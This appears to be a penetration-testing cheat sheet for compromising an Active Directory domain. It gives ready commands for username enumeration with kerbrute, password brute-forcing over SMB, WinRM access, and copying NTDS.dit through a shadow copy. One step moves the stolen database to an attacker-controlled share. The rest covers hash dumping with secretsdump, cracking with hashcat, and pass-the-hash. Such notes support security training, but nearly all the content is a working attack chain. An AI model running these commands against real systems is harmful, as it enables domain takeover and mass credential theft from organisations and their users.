## Username List Generation

When to use: Foothold established, need target-specific lists based on public names or email structures,.

Generate permutations from a list of real names

```
./username-anarchy -i <FILE_PATH>
```

- Tool comparison
    
    - Manual generation → Infer structure from email (e.g., `<USERNAME>@<DOMAIN>`) or PDF metadata → Use when automated tools fail to match a specific obfuscated pattern,
    - Username Anarchy → `./username-anarchy -i <FILE_PATH>` → Use to rapidly create a large volume of common naming convention combinations,
- Gotchas
    
    - **Noisy over network**, large-scale guessing generates high traffic and target system alerts.

---

## Username Enumeration

When to use: Need to identify the correct naming convention and confirm account validity before attempting password attacks.

Identify valid AD accounts via Kerberos

```
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <DOMAIN> <FILE_PATH>
```

- Gotchas
    - **Missing naming convention**, spending time discovering the exact convention reduces the need for guessing.

---

## Password Brute-Force

When to use: Valid usernames confirmed, testing common password lists via SMB.

Test password list against a single confirmed user

```
netexec smb <DC_IP> -u <USERNAME> -p <FILE_PATH>
```

- Dangerous / misconfigured settings
    
    - Default Group Policy: Account lockout policies are not enforced by default in many environments.
- Gotchas
    
    - **Account lockout**, verify if a lockout policy is enforced via GPO before launching high-volume attacks.

---

## Remote Access and Privilege Verification

When to use: Valid credentials obtained, need to establish a session and check for administrative rights,.

Establish PowerShell session via WinRM

```
evil-winrm -i <DC_IP> -u <USERNAME> -p '<PASSWORD>'
```

Check for local administrative rights

```
net localgroup
```

Check for domain-level privileges

```
net user <USERNAME>
```

- Gotchas
    - **Insufficient privileges**, local or domain administrator rights are mandatory for copying NTDS.dit,.

---

## Manual NTDS.dit Extraction

When to use: Admin rights confirmed, need to bypass file locks on the active AD database,.

1. Create a Volume Shadow Copy of the system drive

```
vssadmin CREATE SHADOW /For=C:
```

2. Copy the database from the shadow volume to a staging area

```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ID>\Windows\NTDS\NTDS.dit <FILE_PATH>
```

3. Move the file to an attack host share

```
cmd.exe /c move <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>
```

> ⚠️ Gap: The source does not provide the command for setting up the SMB share on the attack host, which is required for the `move` command to succeed.

- Edge cases
    
    - Non-default NTDS location: Database may be stored on a volume other than C:, requiring `vssadmin` to target the specific drive letter.
- Gotchas
    
    - **Encrypted hashes**, you must also capture the SYSTEM hive to extract keys required for decryption.

---

## Automated NTDS Extraction

When to use: Requirement for a fast, single-command capture and dump of the NTDS database.

Dump NTDS contents via VSS and ntdsutil

```
netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil
```

- Tool comparison
    - Manual VSS → `vssadmin` + `copy` → Prefer when specific file movement or stealth is required.
    - NetExec ntdsutil → `-M ntdsutil` → Prefer for speed; automates capture, transfer, and cleanup,.

---

## Credential Extraction and Cracking

When to use: NTDS.dit and SYSTEM hive files have been successfully exfiltrated to the attack host.

Extract domain hashes from local files

```
impacket-secretsdump -ntds <FILE_PATH> -system <FILE_PATH> LOCAL
```

Attempt to crack recovered NT hashes

```
sudo hashcat -m 1000 <HASH> <FILE_PATH>
```

---

## Pass-the-Hash

When to use: NT hashes obtained but remain uncrackable, lateral movement or remote access is still required.

Authenticate using a hash instead of a cleartext password

```
evil-winrm -i <DC_IP> -u <USERNAME> -H <HASH>
```

- Gotchas
    - **NTLM reliance**, the attack specifically exploits the NTLM authentication protocol.